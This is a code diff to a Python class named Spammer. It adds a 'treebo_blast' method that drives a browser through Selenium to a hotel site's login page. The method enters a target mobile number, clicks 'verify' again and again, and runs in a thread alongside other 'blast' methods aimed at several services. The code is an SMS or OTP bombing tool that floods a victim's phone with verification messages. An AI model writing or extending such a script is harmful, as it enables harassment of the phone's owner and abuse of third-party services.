@@ -126,12 +126,37 @@ class Spammer:
         print(i)
         driver.close()
 
+    def treebo_blast(self):
+        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
+        driver.get("https://www.treebo.com/login/")
+
+        i = 0
+        while self.spam_count <= self.bomb_count:
+            mobile_input = driver.find_element_by_id("mobile")
+            mobile_input.clear()
+            mobile_input.send_keys(self.mobile_no)
+
+            button = driver.find_element_by_id("verify")
+            driver.execute_script("arguments[0].click();", button)
+
+            driver.refresh()
+            self.spam_count += 1
+            self.bomb_count -= 1
+            i += 1
+
+            time.sleep(self.delay)
+
+        print(i)
+        driver.close()
+
     def spam(self):
         t1 = Thread(target=self.hike_blast, args=[])
         t2 = Thread(target=self.redbus_blast, args=[])
         t3 = Thread(target=self.biryani_blast, args=[])
         t4 = Thread(target=self.yatra_blast, args=[])
+        t5 = Thread(target=self.treebo_blast, args=[])
         t1.start()
         t2.start()
         t3.start()
         t4.start()
+        t5.start()
